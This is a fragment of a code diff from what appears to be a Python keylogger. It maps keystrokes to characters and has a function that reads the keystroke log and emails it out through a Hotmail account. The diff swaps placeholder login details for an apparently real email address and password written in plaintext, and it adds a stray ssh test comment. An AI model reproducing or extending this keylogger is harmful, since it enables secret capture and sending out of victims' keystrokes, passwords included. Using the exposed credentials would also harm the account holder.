@@ -19,7 +19,7 @@ dict_key = {
         "slash":'/',
         "underscore":'_',
         "Tab":'[Tab]		',
-        "ntilde":'ñ',
+        "ntilde":'[ny]',
         "plus":'*',
         "BackSpace":'[Borrar]',
 	"ampersand":'&',
@@ -91,8 +91,8 @@ def SendEmail(user, pwd, recipient, asunto, body):
 
 def FormatAndSendLogEmail():
 	
-    hotmail_user = "yourEmail@hotmail.com"
-    hotmail_pass = "yourPassword"
+    hotmail_user = "kevinliebergen@hotmail.com"
+    hotmail_pass = "Amimer1."
 
     with open(log_file, 'r+') as f:
         actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -128,3 +128,5 @@ while running:
 
 
 sys.exit(0)
+
+#prueba ssh
